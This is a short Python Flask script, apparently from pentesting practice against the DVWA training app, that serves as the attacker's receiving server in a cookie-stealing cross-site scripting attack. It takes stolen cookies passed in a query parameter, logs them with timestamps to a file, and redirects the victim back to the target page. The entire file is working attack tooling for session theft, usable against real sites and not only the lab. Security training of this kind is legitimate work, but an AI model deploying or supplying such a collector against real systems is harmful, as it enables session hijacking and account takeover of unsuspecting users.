from flask import Flask, request, redirect
from datetime import datetime

"""
quick and dirty cookie receiver.
Credit goes to: Laur Telliskivi
from the article found at: https://medium.com/@laur.telliskivi/pentesting-basics-cookie-grabber-xss-8b672e4738b2
with modifications to the way the cookies.txt is written to make it look more like a log
"""

app = Flask(__name__)


@app.route('/')
def cookie_grabber():
    cookie = request.args.get('c')
    f = open('cookies.txt', 'a')
    f.write(str(datetime.now()) + " cookie captured: "  + cookie + "\n" )
    f.close()
    return redirect('http://192.168.86.130/dvwa/')


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
